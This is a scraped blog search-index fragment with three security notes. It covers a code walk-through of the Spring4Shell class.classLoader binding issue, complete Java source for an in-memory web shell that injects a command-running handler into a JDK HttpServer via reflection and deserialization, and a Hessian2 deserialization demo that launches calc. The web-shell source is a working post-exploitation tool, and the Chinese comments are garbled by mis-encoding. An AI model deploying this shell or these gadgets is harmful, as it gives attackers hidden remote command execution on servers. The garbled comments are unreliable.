if (KotlinDetector.isKotlinReflectPresent() &amp;&amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) &#123; return BeanUtils.KotlinDelegate.instantiateClass(ctor, args); &#125; else &#123; Class&lt;?&gt;[] parameterTypes = ctor.getParameterTypes(); Assert.isTrue(args.length &lt;= parameterTypes.length, &quot;Can&#39;t specify more arguments than constructor parameters&quot;); Object[] argsWithDefaultValues = new Object[args.length]; for(int i = 0; i &lt; args.length; ++i) &#123; if (args[i] == null) &#123; Class&lt;?&gt; parameterType = parameterTypes[i]; argsWithDefaultValues[i] = parameterType.isPrimitive() ? DEFAULT_TYPE_VALUES.get(parameterType) : null; &#125; else &#123; argsWithDefaultValues[i] = args[i]; &#125; &#125; return ctor.newInstance(argsWithDefaultValues);//ç±»åˆå§‹åŒ–ä¸ºå¯¹è±¡ createBinder//è®¾ç½®targetDefaultDataBinderFactory public final WebDataBinder createBinder(NativeWebRequest webRequest, @Nullable Object target, String objectName) throws Exception &#123; WebDataBinder dataBinder = this.createBinderInstance(target, objectName, webRequest); protected WebDataBinder createBinderInstance(@Nullable Object target, String objectName, NativeWebRequest webRequest) throws Exception &#123; return new WebRequestDataBinder(target, objectName); &#125; public WebRequestDataBinder(@Nullable Object target, String objectName) &#123; super(target, objectName); &#125; public WebDataBinder(@Nullable Object target, String objectName) &#123; super(target, objectName); &#125; public DataBinder(@Nullable Object target, String objectName) &#123; this.directFieldAccess = false; this.ignoreUnknownFields = true; this.ignoreInvalidFields = false; this.autoGrowNestedPaths = true; this.autoGrowCollectionLimit = 256; this.bindingErrorProcessor = new DefaultBindingErrorProcessor(); this.validators = new ArrayList(); this.target = ObjectUtils.unwrapOptional(target);//è®¾ç½®target this.objectName = objectName; &#125; bindRequestParameters//å‚æ•°ç»‘å®š ServletModelAttributeMethodProcessor protected void bindRequestParameters(WebDataBinder binder, NativeWebRequest request) &#123; ServletRequest servletRequest = (ServletRequest)request.getNativeRequest(ServletRequest.class); Assert.state(servletRequest != null, &quot;No ServletRequest&quot;); ServletRequestDataBinder servletBinder = (ServletRequestDataBinder)binder; servletBinder.bind(servletRequest);// &#125; ServletRequestDataBinder public void bind(ServletRequest request) &#123; MutablePropertyValues mpvs = new ServletRequestParameterPropertyValues(request); ... this.doBind(mpvs); &#125; protected void doBind(MutablePropertyValues mpvs) &#123; this.checkFieldDefaults(mpvs); this.checkFieldMarkers(mpvs); this.adaptEmptyArrayIndices(mpvs); super.doBind(mpvs);// &#125; //DataBinder protected void doBind(MutablePropertyValues mpvs) &#123; this.checkAllowedFields(mpvs); this.checkRequiredFields(mpvs); this.applyPropertyValues(mpvs);// &#125; protected void applyPropertyValues(MutablePropertyValues mpvs) &#123; try &#123; this.getPropertyAccessor().setPropertyValues(mpvs, this.isIgnoreUnknownFields(), this.isIgnoreInvalidFields());//this.getPropertyAccessor().setPropertyValues() getPropertyAccessorDataBinder protected ConfigurablePropertyAccessor getPropertyAccessor() &#123; return this.getInternalBindingResult().getPropertyAccessor(); &#125; protected AbstractPropertyBindingResult getInternalBindingResult() &#123; if (this.bindingResult == null) &#123; this.bindingResult = this.directFieldAccess ? this.createDirectFieldBindingResult() : this.createBeanPropertyBindingResult(); &#125; return this.bindingResult; &#125; protected AbstractPropertyBindingResult createBeanPropertyBindingResult() &#123; BeanPropertyBindingResult result = new BeanPropertyBindingResult(this.getTarget(), this.getObjectName(), this.isAutoGrowNestedPaths(), this.getAutoGrowCollectionLimit()); if (this.conversionService != null) &#123; result.initConversion(this.conversionService);//initConversion &#125; if (this.messageCodesResolver != null) &#123;//null ... &#125; return result; &#125; BeanPropertyBindingResult public void initConversion(ConversionService conversionService) &#123; Assert.notNull(conversionService, &quot;ConversionService must not be null&quot;); this.conversionService = conversionService; if (this.getTarget() != null) &#123; this.getPropertyAccessor().setConversionService(conversionService); &#125; &#125; public final ConfigurablePropertyAccessor getPropertyAccessor() &#123; if (this.beanWrapper == null) &#123; this.beanWrapper = this.createBeanWrapper();// ... &#125; return this.beanWrapper;//getPropertyAccessor() è¿”å› BeanWrapperImpl &#125; protected BeanWrapper createBeanWrapper() &#123; if (this.target == null) &#123; ... &#125; else &#123; return PropertyAccessorFactory.forBeanPropertyAccess(this.target);// &#125; &#125; PropertyAccessorFactory public static BeanWrapper forBeanPropertyAccess(Object target) &#123; return new BeanWrapperImpl(target); &#125; BeanWrapperImpl //target-&gt;wrappedObject public BeanWrapperImpl(Object object) &#123; super(object); &#125; //AbstractNestablePropertyAccessor protected AbstractNestablePropertyAccessor(Object object) &#123; ... this.setWrappedInstance(object); &#125; public void setWrappedInstance(Object object, @Nullable String nestedPath, @Nullable Object rootObject) &#123; this.wrappedObject = ObjectUtils.unwrapOptional(object);//target-&gt;wrappedObject setPropertyValuesBeanWrapperImpl public void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid) throws BeansException &#123; List&lt;PropertyAccessException&gt; propertyAccessExceptions = null; List&lt;PropertyValue&gt; propertyValues = pvs instanceof MutablePropertyValues ? ((MutablePropertyValues)pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues());//MutablePropertyValues å¤šä¸ªé”®å€¼å¯¹?è¿˜æ˜¯multi postæ ¼å¼?æ„Ÿè§‰åè€…å¯èƒ½æ€§æ›´å¤§ if (ignoreUnknown) &#123; this.suppressNotWritablePropertyException = true; &#125; try &#123; Iterator var6 = propertyValues.iterator(); while(var6.hasNext()) &#123; PropertyValue pv = (PropertyValue)var6.next(); try &#123; this.setPropertyValue(pv);//pvséå† public void setPropertyValue(PropertyValue pv) throws BeansException &#123; AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = (AbstractNestablePropertyAccessor.PropertyTokenHolder)pv.resolvedTokens; if (tokens == null) &#123;//null String propertyName = pv.getName(); AbstractNestablePropertyAccessor nestedPa; try &#123; nestedPa = this.getPropertyAccessorForPropertyPath(propertyName);//å±æ€§è·¯å¾„è§£æ//è§£æå¦‚æœé”™è¯¯(è·å–ä¸åˆ°å±æ€§)å°±æŠ¥é”™é€€å‡º &#125; catch (NotReadablePropertyException var6) &#123; throw new NotWritablePropertyException(this.getRootClass(), this.nestedPath + propertyName, &quot;Nested property in path &#39;&quot; + propertyName + &quot;&#39; does not exist&quot;, var6); &#125; tokens = this.getPropertyNameTokens(this.getFinalPath(nestedPa, propertyName)); if (nestedPa == this) &#123; pv.getOriginalPropertyValue().resolvedTokens = tokens; &#125; nestedPa.setPropertyValue(tokens, pv);// &#125; else &#123; this.setPropertyValue(tokens, pv); &#125; &#125; getPropertyAccessorForPropertyPath//å±æ€§è·¯å¾„é€’å½’è§£æè·å–å±æ€§ BeanWrapperImpl protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) &#123; int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);//è¿”å›ä½ç½®ç‚¹å·//ä¸­æ‹¬å· if (pos &gt; -1) &#123; String nestedProperty = propertyPath.substring(0, pos); String nestedPath = propertyPath.substring(pos + 1); AbstractNestablePropertyAccessor nestedPa = this.getNestedPropertyAccessor(nestedProperty);//getNestedPropertyAccessor return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);//é€’å½’ &#125; else &#123; return this; &#125; &#125; //getLocalPropertyHandler private AbstractNestablePropertyAccessor getNestedPropertyAccessor(String nestedProperty) &#123; if (this.nestedPropertyAccessors == null) &#123; this.nestedPropertyAccessors = new HashMap(); &#125; AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = this.getPropertyNameTokens(nestedProperty); String canonicalName = tokens.canonicalName; Object value = this.getPropertyValue(tokens);...&#125; protected Object getPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens) throws BeansException &#123; String propertyName = tokens.canonicalName; String actualName = tokens.actualName; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(actualName);//getLocalPropertyHandler if (ph != null &amp;&amp; ph.isReadable()) &#123; try &#123; Object value = ph.getValue();//getValue //è®¾ç½® ph.pd protected BeanWrapperImpl.BeanPropertyHandler getLocalPropertyHandler(String propertyName) &#123; PropertyDescriptor pd = this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName); return pd != null ? new BeanWrapperImpl.BeanPropertyHandler(pd) : null; &#125; public BeanPropertyHandler(PropertyDescriptor pd) &#123; super(pd.getPropertyType(), pd.getReadMethod() != null, pd.getWriteMethod() != null); this.pd = pd; &#125; setPropertyValue protected void setPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) throws BeansException &#123; if (tokens.keys != null) &#123;//null this.processKeyedProperty(tokens, pv); &#125; else &#123; this.processLocalProperty(tokens, pv);// &#125; &#125; private void processLocalProperty(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) &#123; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(tokens.actualName); if (ph != null &amp;&amp; ph.isWritable()) &#123; Object oldValue = null; PropertyChangeEvent propertyChangeEvent; try &#123;//id=1 Object originalValue = pv.getValue();//&quot;1&quot; Object valueToApply = originalValue;//&quot;1&quot; if (!Boolean.FALSE.equals(pv.conversionNecessary)) &#123;//pv.conversionNecessary=null if (pv.isConverted()) &#123;//pv.converted=false valueToApply = pv.getConvertedValue(); &#125; else &#123; if (this.isExtractOldValueForEditor() &amp;&amp; ph.isReadable()) &#123; try &#123;//this.extractOldValueForEditor=true//ph.readable=true oldValue = ph.getValue();//getValue &#125; &#125; valueToApply = this.convertForProperty(tokens.canonicalName, oldValue, originalValue, ph.toTypeDescriptor()); &#125; pv.getOriginalPropertyValue().conversionNecessary = valueToApply != originalValue; &#125; ph.setValue(valueToApply);//setValue BeanWrapperImpl$BeanPropertyHandler//ph//sink getValue public Object getValue() throws Exception &#123; Method readMethod = this.pd.getReadMethod();//getId() if (System.getSecurityManager() != null) &#123;//null ... &#125; else &#123; ReflectionUtils.makeAccessible(readMethod); return readMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), (Object[])null); &#125; &#125; public final Object getWrappedInstance() &#123; Assert.state(this.wrappedObject != null, &quot;No wrapped object&quot;); return this.wrappedObject;//å‰é¢target-&gt;wrappedObject &#125; setValue public void setValue(@Nullable Object value) throws Exception &#123; Method writeMethod = this.pd instanceof GenericTypeAwarePropertyDescriptor ? ((GenericTypeAwarePropertyDescriptor)this.pd).getWriteMethodForActualAccess() : this.pd.getWriteMethod();//setId() if (System.getSecurityManager() != null) &#123; ... &#125; else &#123; ReflectionUtils.makeAccessible(writeMethod); writeMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), value); &#125; å†å²è¡¥ä¸//è¿‡æ»¤classloadercurl http://localhost:8877/handling_form_submission_complete_war_exploded/greeting -d &quot;class.classLoader=1&quot; private void processLocalProperty(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) &#123; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(tokens.actualName); if (ph != null &amp;&amp; ph.isWritable()) &#123;//ph=null ... &#125; else if (pv.isOptional()) &#123;//false ... &#125; else if (!this.suppressNotWritablePropertyException) &#123;//!false throw this.createNotWritablePropertyException(tokens.canonicalName);//æŠ¥é”™ &#125; protected BeanWrapperImpl.BeanPropertyHandler getLocalPropertyHandler(String propertyName) &#123; PropertyDescriptor pd = this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName);//getPropertyDescriptorè¿”å›null//mapé‡Œæ²¡æœ‰classLoaderå±æ€§ return pd != null ? new BeanWrapperImpl.BeanPropertyHandler(pd) : null; &#125; private CachedIntrospectionResults(Class&lt;?&gt; beanClass) throws BeansException &#123; try &#123; ... this.beanInfo = getBeanInfo(beanClass); ... this.propertyDescriptors = new LinkedHashMap(); Set&lt;String&gt; readMethodNames = new HashSet(); PropertyDescriptor[] pds = this.beanInfo.getPropertyDescriptors(); PropertyDescriptor[] var4 = pds; int var5 = pds.length; for(int var6 = 0; var6 &lt; var5; ++var6) &#123; PropertyDescriptor pd = var4[var6]; if (Class.class != beanClass || !&quot;classLoader&quot;.equals(pd.getName()) &amp;&amp; !&quot;protectionDomain&quot;.equals(pd.getName())) &#123;//è¿‡æ»¤Classçš„classLoaderå’ŒprotectionDomainå±æ€§ if (logger.isTraceEnabled()) &#123; logger.trace(&quot;Found bean property &#39;&quot; + pd.getName() + &quot;&#39;&quot; + (pd.getPropertyType() != null ? &quot; of type [&quot; + pd.getPropertyType().getName() + &quot;]&quot; : &quot;&quot;) + (pd.getPropertyEditorClass() != null ? &quot;; editor [&quot; + pd.getPropertyEditorClass().getName() + &quot;]&quot; : &quot;&quot;)); &#125; pd = this.buildGenericTypeAwarePropertyDescriptor(beanClass, pd); this.propertyDescriptors.put(pd.getName(), pd); Method readMethod = pd.getReadMethod(); if (readMethod != null) &#123; readMethodNames.add(readMethod.getName()); &#125; &#125; &#125; &gt;=jdk9 module.classloaderç»•è¿‡https://xz.aliyun.com/t/11143 Class.getModule() ä¸æ˜¯ Class.class ç»•è¿‡classLoaderåˆ¤æ–­ exphttps://github.com/lunasec-io/Spring4Shell-POC curl http://localhost:8877/handling_form_submission_complete_war_exploded/greeting -d &quot;class.classloader=1&quot; windows tomcatå¯åŠ¨waråŒ…//ç”¨ideaå¯åŠ¨tomcatçš„æƒ…å†µï¼Œpocå¤±è´¥äº†ï¼Œæ²¡å†™ä¸Šæ–‡ä»¶ï¼ˆç›®å½•é—®é¢˜ï¼‰","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"HttpHandlerå†…å­˜é©¬","slug":"HttpHandlerå†…å­˜é©¬","date":"2022-04-02T11:50:43.951Z","updated":"2022-04-02T11:52:34.200Z","comments":true,"path":"2022/04/02/HttpHandlerå†…å­˜é©¬/","link":"","permalink":"https://pipimi110.github.io/2022/04/02/HttpHandler%E5%86%85%E5%AD%98%E9%A9%AC/","excerpt":"","text":"handlerDemopackage com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import templates.ShellHandler; import java.io.*; import java.lang.reflect.Field; import java.lang.reflect.Member; import java.net.InetSocketAddress; import java.util.Base64; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index1 &#123; public Index1() &#123; &#125; public static void main(String[] args) throws Exception &#123; System.out.println(&quot;server start&quot;); HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0); server.createContext(&quot;/&quot;, new Index1.MyHandler()); // server.createContext(&quot;/ShellHandler&quot;, new ShellHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); &#125; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); Map&lt;String, String&gt; queryMap = this.queryToMap(query); String response = &quot;Welcome to HFCTF 2022&quot;; if (queryMap != null) &#123; String token = (String) queryMap.get(&quot;token&quot;); String secret = &quot;HFCTF2022&quot;; if (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123; // if (true) &#123; InputStream is = t.getRequestBody(); try &#123; Hessian2Input input = new Hessian2Input(is); input.readObject(); &#125; catch (Exception var9) &#123; response = &quot;oops! something is wrong&quot;; &#125; &#125; else &#123; response = &quot;your token is wrong&quot;; &#125; &#125; t.sendResponseHeaders(200, (long) response.length()); OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); &#125; public Map&lt;String, String&gt; queryToMap(String query) &#123; if (query == null) &#123; return null; &#125; else &#123; Map&lt;String, String&gt; result = new HashMap(); String[] var3 = query.split(&quot;&amp;&quot;); int var4 = var3.length; for (int var5 = 0; var5 &lt; var4; ++var5) &#123; String param = var3[var5]; String[] entry = param.split(&quot;=&quot;); if (entry.length &gt; 1) &#123; result.put(entry[0], entry[1]); &#125; else &#123; result.put(entry[0], &quot;&quot;); &#125; &#125; return result; &#125; &#125; &#125; &#125; handleré©¬package templates; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStream; public class ShellHandler implements HttpHandler &#123; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); String res = &quot;hello world&quot;; if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123; String[] flag = query.split(&quot;=&quot;); if (flag[0].equals(&quot;popko&quot;)) &#123; String line = null; BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;)); while ((line = reader.readLine()) != null) &#123; // System.out.println(line); res += line; &#125; &#125; &#125; t.sendResponseHeaders(200, res.length()); OutputStream os = t.getResponseBody(); os.write(res.getBytes()); os.close(); &#125; &#125; æ›¿æ¢handlerThread.currentThread().getThreadGroup() // System.out.println(new ShellHandler() instanceof ShellHandler); // System.out.println(ShellHandler.class.isInstance(new ShellHandler())); System.out.println(Class.forName(&quot;templates.ShellHandler&quot;).isInstance(new ShellHandler())); å¯»æ‰¾targetä¸ä¸ºç©º this$0-&gt;contexts-&gt;list[0]-&gt;handler æ›¿æ¢æ‰€æœ‰handler getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;),&quot;list&quot;) //LinkedListéå† int size = list.size(); for (int i=0; i&lt;size; i++) &#123; list.get(i); &#125; åŠ å·è½¬ä¸ºç©ºæ ¼ t.getRequestURI().getQuery().replace(â€œ+â€,â€ â€œ); http://localhost:8090/?fuckkk=cat+/etc/passwd æ·»åŠ handler public static void main(String[] args) throws Exception &#123; System.out.println(&quot;server start&quot;); HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0); server.createContext(&quot;/&quot;, new Index1.MyHandler());//æ–­ç‚¹ // server.createContext(&quot;/ShellHandler&quot;, new ShellHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); &#125; è·å–serverå°±å¯ä»¥æ·»åŠ handleräº† exppackage marshalsec.templates; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStream; import java.lang.reflect.Field; import java.util.LinkedList; public class ShellHandler extends AbstractTranslet implements HttpHandler &#123; static &#123; System.out.println(&quot;[]start&quot;); try &#123; // replaceHandlers(); addHandler(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;[]end&quot;); &#125; public static Object getFV(Object var0, String var1) throws Exception &#123; Field var2 = null; Class var3 = var0.getClass(); while (var3 != Object.class) &#123; try &#123; var2 = var3.getDeclaredField(var1); break; &#125; catch (NoSuchFieldException var5) &#123; var3 = var3.getSuperclass(); &#125; &#125; if (var2 == null) &#123; throw new NoSuchFieldException(var1); &#125; else &#123; var2.setAccessible(true); return var2.get(var0); &#125; &#125; public static LinkedList getContextList() throws Exception &#123; try &#123; Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (int var6 = 0; var6 &lt; var5.length; ++var6) &#123; Thread var7 = var5[var6]; if (var7 != null) &#123; Object var1 = getFV(var7, &quot;target&quot;); if (var1 != null) &#123; // Object var1 = getFV(var7, &quot;target&quot;); // if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(Thread.currentThread().getThreadGroup().threads[1].target)) &#123; if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(var1)) &#123; LinkedList var2 = (LinkedList) getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;), &quot;list&quot;); return var2; &#125; &#125; &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; public static void addHandler() throws Exception &#123; LinkedList var2 = getContextList(); if (var2 != null) &#123; Object var3 = getFV(var2.get(0), &quot;server&quot;); java.lang.reflect.Method method = var3.getClass().getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class); method.setAccessible(true); String mapper = &quot;/favicon11.jpg&quot;; method.invoke(var3, mapper, new ShellHandler()); &#125; &#125; public static void replaceHandlers() throws Exception &#123; LinkedList var2 = getContextList(); if (var2 != null) &#123; for (int i = 0; i &lt; var2.size(); i++) &#123; Object var3 = var2.get(i); Field field = var3.getClass().getDeclaredField(&quot;handler&quot;); field.setAccessible(true); field.set(var3, new ShellHandler()); &#125; &#125; &#125; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); String res = &quot;hello world&quot;; if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123; String[] flag = query.replace(&quot;+&quot;, &quot; &quot;).split(&quot;=&quot;); if (flag[0].equals(&quot;fuckkk&quot;)) &#123; String line = null; BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;)); while ((line = reader.readLine()) != null) &#123; // System.out.println(line); res += line; &#125; &#125; &#125; t.sendResponseHeaders(200, res.length()); OutputStream os = t.getResponseBody(); os.write(res.getBytes()); os.close(); &#125; @Override public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; &#125;","categories":[{"name":"åæ¸—é€","slug":"åæ¸—é€","permalink":"https://pipimi110.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"åæ¸—é€","slug":"åæ¸—é€","permalink":"https://pipimi110.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"Hessian2ååºåˆ—åŒ–","slug":"Hessian2","date":"2022-04-01T10:39:39.999Z","updated":"2022-09-24T15:51:10.783Z","comments":true,"path":"2022/04/01/Hessian2/","link":"","permalink":"https://pipimi110.github.io/2022/04/01/Hessian2/","excerpt":"","text":"Hessian2https://www.cnblogs.com/bitterz/p/15526206.html åååºåˆ—åŒ–åˆ©ç”¨ ååºåˆ—åŒ–å®Œæˆåï¼Œç”±äºæŠ¥é”™è¯­å¥æ‹¼æ¥ï¼Œè§¦å‘ä»»æ„ç±»toStringæ–¹æ³• CVE-2020-1948(dubboæ¼æ´.md) ååºåˆ—åŒ–åˆ©ç”¨ èƒ½ä¸èƒ½ç›´æ¥è§¦å‘readObjectååºåˆ—åŒ–å‘¢? Hessian2ObjectInputé‡å†™çš„readObjectåªæœ‰ç±»åˆå§‹åŒ–å’Œåå°„ï¼Œæ²¡æœ‰åŸç”ŸreadObjecté‡Œçš„å„ç§è°ƒç”¨ï¼Œä¹Ÿä¸åƒfastjsonä¼šè§¦å‘setter,getter ä½†æ˜¯hashmapä¼šè§¦å‘putæ–¹æ³•ï¼Œå¯ä»¥ä½œä¸ºgadgetçš„å…¥å£ demoimport org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput; import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput; import java.io.*; import java.util.HashMap; public class unser1 &#123; public static class MyHashMap&lt;K, V&gt; extends HashMap&lt;K, V&gt; &#123; public V put(K key, V value) &#123; super.put(key, value); System.out.println(111111111); try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (Exception e) &#123; &#125; System.out.println(22222222); return null; &#125; &#125; public static void main(String[] args) throws Exception&#123; // MyHashMap map = new MyHashMap(); // HashMap map = new HashMap(); // map.put(&quot;1&quot;, &quot;1&quot;);//å…±ä¸¤æ¬¡calc Person person = new Person(); person.setAge(20); person.setHobby(&quot;acg&quot;); person.setName(&quot;popko&quot;); person.setSex(&quot;male&quot;); // byte[] bytes = serialize(map); byte[] bytes = serialize(person); System.out.println(new String(bytes, 0, bytes.length)); Object o = unserialize(bytes); System.out.println(o); &#125; public static Object unserialize(byte[] bytes) throws Exception&#123; // hessian2çš„ååºåˆ—åŒ– ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); Hessian2ObjectInput hessian2Input = new Hessian2ObjectInput(byteArrayInputStream); Object o = hessian2Input.readObject();//å…±ä¸¤æ¬¡calc return o; &#125; public static byte[] serialize(Object obj) throws Exception&#123; // hessian2çš„åºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2ObjectOutput hessian2Output = new Hessian2ObjectOutput(byteArrayOutputStream); hessian2Output.writeObject(obj); hessian2Output.flushBuffer(); return byteArrayOutputStream.toByteArray(); &#125; &#125; ååºåˆ—åŒ–æµç¨‹éå†å‡ºæ— å‚æ„é€ å‡½æ•° ååºåˆ—åŒ–æ—¶newInstanceä¹‹å‰æ²¡æœ‰setAccessï¼Œååºåˆ—åŒ–ç±»æ— å‚æ„é€ å‡½æ•°å¦‚æœépublicä¼šæŠ¥é”™ ensureMemberAccess:98, Reflection (sun.reflect) slowCheckMemberAccess:296, AccessibleObject (java.lang.reflect) checkAccess:288, AccessibleObject (java.lang.reflect) newInstance:413, Constructor (java.lang.reflect)//newInstanceä¹‹å‰æ²¡æœ‰setAccess readMap:105, MapDeserializer (com.caucho.hessian.io) readMap:532, SerializerFactory (com.caucho.hessian.io) readObject:2117, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) hessianUnser:37, demo1 main:66, demo1 map = (Map)this._ctor.newInstance(); public MapDeserializer(Class&lt;?&gt; type) &#123; if (type == null) &#123; type = HashMap.class; &#125; this._type = type; Constructor&lt;?&gt;[] ctors = type.getConstructors(); for(int i = 0; i &lt; ctors.length; ++i) &#123; if (ctors[i].getParameterTypes().length == 0) &#123; this._ctor = ctors[i]; &#125;//éå†å‡ºæ— å‚æ„é€ å‡½æ•° &#125; if (this._ctor == null) &#123; try &#123; this._ctor = HashMap.class.getConstructor(); &#125; catch (Exception var4) &#123; throw new IllegalStateException(var4); &#125; &#125; &#125; æ„é€ å‡½æ•°åˆå§‹åŒ–åï¼Œç»§ç»­ååºåˆ—åŒ– map = (Map)this._ctor.newInstance(); &#125; catch (Exception var4) &#123; throw new IOExceptionWrapper(var4); &#125; &#125; in.addRef(map); while(!in.isEnd()) &#123; ((Map)map).put(in.readObject(), in.readObject());//ç»§ç»­hessianInputååºåˆ—åŒ– &#125; readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:532, SerializerFactory (com.caucho.hessian.io) readObject:2117, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io)//ç»§ç»­hessianInputååºåˆ—åŒ– readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) hessianUnser:39, demo1 main:68, demo1 åŸç”Ÿhessionä½¿ç”¨äº†Unsafeå¯ä»¥ä½¿ç”¨åˆå§‹åŒ–ä»»æ„ç±» å…¥å£org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException &#123; return this.mH2i.readObject(cls); &#125; Hessian2Inputä¹Ÿå¯ä»¥ä½œä¸ºå…¥å£ instantiate:306, UnsafeDeserializer (com.caucho.hessian.io) readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) main:38, exp2 Person(ä¸€èˆ¬ç±»)ååºåˆ—åŒ–com\\alibaba\\com\\caucho\\hessian\\io\\Hessian2Input.class public Object readObject() throws IOException &#123; return this.readObject((List)null); &#125; public Object readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes) throws IOException &#123; ... case 67: this.readObjectDefinition((Class)null); return this.readObject(); private void readObjectDefinition(Class cl) throws IOException &#123; String type = this.readString(); int len = this.readInt(); String[] fieldNames = new String[len]; for(int i = 0; i &lt; len; ++i) &#123; fieldNames[i] = this.readString(); &#125; Hessian2Input.ObjectDefinition def = new Hessian2Input.ObjectDefinition(type, fieldNames); if (this._classDefs == null) &#123; this._classDefs = new ArrayList(); &#125; this._classDefs.add(def); &#125; å†æ¬¡this.readObject()-&gt;this.readObject((List)null) private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); String[] fieldNames = def.getFieldNames(); if (cl != null) &#123; ... &#125; else &#123; return this.findSerializerFactory().readObject(this, type, fieldNames); &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\SerializerFactory.class public 